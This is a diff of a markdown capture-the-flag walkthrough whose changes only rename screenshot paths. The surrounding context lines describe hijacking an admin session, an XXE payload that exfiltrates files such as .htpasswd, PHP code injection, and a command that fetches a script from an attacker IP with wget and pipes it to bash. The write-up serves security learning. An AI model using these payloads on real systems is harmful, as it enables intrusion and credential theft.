@@ -107,7 +107,7 @@ token=ddac62a28254561001277727cb397baf
 
 By replacing the PHPSESSID with our own created user, we can become an administrator by sending the same POST request to the website.
 
-<figure><img src="../../../.gitbook/assets/image (37) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (37) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 From here, we can register our own user and gain access to the API stuff.
 
@@ -147,7 +147,7 @@ After some trial and error, I found that using the `php://filter/` method worked
 %exfiltrate;
 ```
 
-<figure><img src="../../../.gitbook/assets/image (35) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (35) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Payload used:
 
@@ -157,7 +157,7 @@ manage_api=<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe S
 
 From here, I wanted to read the `/var/www/developers/.htpasswd` file since we found a password on it earlier.
 
-<figure><img src="../../../.gitbook/assets/image (42) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (42) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Using `john`, we could crack the hash to give `r0cket` as the password. We were confronted with another login page.
 
@@ -213,7 +213,7 @@ Testing this out, I used this command ``<?= `id` ?>.``
 
 This worked out pretty well as I was able to see the output here.
 
-<figure><img src="../../../.gitbook/assets/image (38) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (38) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can then replace the command with ``<?=`wget -O - 10.10.14.152/b|bash` ?>``
 
@@ -229,7 +229,7 @@ Victor was the only user on this machine, and we needed to find his credentials 
 
 Within the `~/developers/login.php` file, I found some credentials.
 
-<figure><img src="../../../.gitbook/assets/image (27) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (27) (2) (2).png" alt=""><figcaption></figcaption></figure>
 
 It appears there was a MySQL Instance on the machine running. We can login to that using `mysql -u webapp_user -p`.
 
@@ -239,7 +239,7 @@ Then, we can enumerate this database.
 
 We can find a hash from the `developers` database.
 
-<figure><img src="../../../.gitbook/assets/image (34) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (34) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Couldn't crack the hash though.
 
